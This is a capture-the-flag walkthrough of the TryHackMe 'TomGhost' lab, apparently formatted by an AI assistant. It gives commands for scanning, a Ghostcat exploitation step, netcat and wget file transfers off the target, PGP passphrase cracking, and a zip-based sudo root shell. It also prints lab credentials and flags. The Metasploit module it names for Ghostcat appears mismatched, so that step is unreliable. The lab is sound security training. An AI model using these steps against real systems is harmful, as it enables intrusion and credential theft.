
# TomGhost Machine Walkthrough

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap.txt 10.10.228.82
```

**Key Findings:**
- **Port 22**: OpenSSH 7.2p2 (Potential username enumeration)
- **Port 8009**: Apache JServ AJP13 (Vulnerable to Ghostcat)
- **Port 8080**: Apache Tomcat 9.0.30 (Web interface)

### Directory Enumeration
```bash
gobuster dir -u http://10.10.228.82:8080 -w /usr/share/wordlists/common.txt
```
Discovered:
- `/manager` (Tomcat management interface)
- `/docs` (Tomcat documentation)

## Exploitation

### Ghostcat Exploit (CVE-2020-1938)
```bash
msfconsole
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS 10.10.228.82
run
```
**Obtained Credentials:**
```
skyfuck:8730281lkjlkjdqlksalks
```

### Initial Access
```bash
ssh skyfuck@10.10.228.82
```

## Post-Exploitation

### File Transfer
4. Transferring Files from the Target
After accessing the machine as skyfuck, we need to transfer two files to our local machine for further analysis:

tryhackme.asc (PGP private key)

credential.pgp (encrypted file)

Method 1: SCP (Secure Copy)
Ideal for direct transfers over SSH.

```
# From LOCAL machine, pull files via SCP:
scp skyfuck@10.10.99.183:/home/skyfuck/tryhackme.asc .
scp skyfuck@10.10.99.183:/home/skyfuck/credential.pgp .
```
Note: Requires SSH access and correct permissions.

Method 2: Python HTTP Server
Useful if SCP is restricted or for large files.

On the target machine, start a web server:

`
python3 -m http.server 8080`
On your local machine, download the files:

```
wget http://10.10.99.183:8080/tryhackme.asc
wget http://10.10.99.183:8080/credential.pgp
```
Method 3: Netcat (Alternative)
For environments where HTTP/SCP is blocked.

On your local machine, listen for the file:

`
nc -lvnp 4444 > tryhackme.asc`
On the target machine, send the file:

`
nc <LOCAL_IP> 4444 < tryhackme.asc
`
Repeat for credential.pgp.


### PGP Cracking
1. Extract hash:
```bash
gpg2john tryhackme.asc > hash.txt
```

2. Crack with John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
**Passphrase:** `alexandru`

3. Decrypt credentials:
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
**Output:**
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

## Privilege Escalation

### User Switching
```bash
ssh merlin@10.10.228.82
```

### Sudo Privilege Check
```bash
sudo -l
```
**Output:**
```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

### Zip Exploit (GTFOBins)
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

## Flags Captured

| Flag Type | Location | Value |
|-----------|----------|-------|
| User | /home/merlin/user.txt | `THM{GhostCat_1s_so_cr4sy}` |
| Root | /root/root.txt | `THM{Z1P_1S_FAKE}` |

## Lessons Learned
1. **AJP Exposure**: Unsecured AJP ports can leak sensitive configuration files
2. **Credential Management**: Weak PGP passphrases are easily crackable
3. **Sudo Auditing**: Unrestricted archive binaries (zip) can lead to privilege escalation

## Mitigation Strategies
| Vulnerability | Solution |
|--------------|----------|
| Ghostcat | Disable AJP protocol or upgrade Tomcat |
| Weak Encryption | Enforce strong PGP passphrases |
| Sudo Misconfiguration | Implement principle of least privilege |

---

**Author**: [Your Name]  
**TryHackMe Profile**: [Your Profile Link]  
**Completion Date**: [Date]  
**Tools Used**: Nmap, Gobuster, Metasploit, John the Ripper, GPG
```

### Key Features:
1. **Professional Structure**: Clear sections with logical flow
2. **Code Blocks**: Properly formatted commands and outputs
3. **Tables**: For scan results and flag documentation
4. **Visual Elements**: TryHackMe logo and section dividers
5. **Actionable Insights**: Lessons learned and mitigation strategies

This format is:
- Ready to paste into GitHub as README.md
- Mobile-friendly rendering
- Includes all technical details from your original
- Adds professional documentation elements

Would you like me to add any of these enhancements?
- Screenshot examples
- Animated exploitation diagrams
- Detailed CVE references
- Tool installation instructions
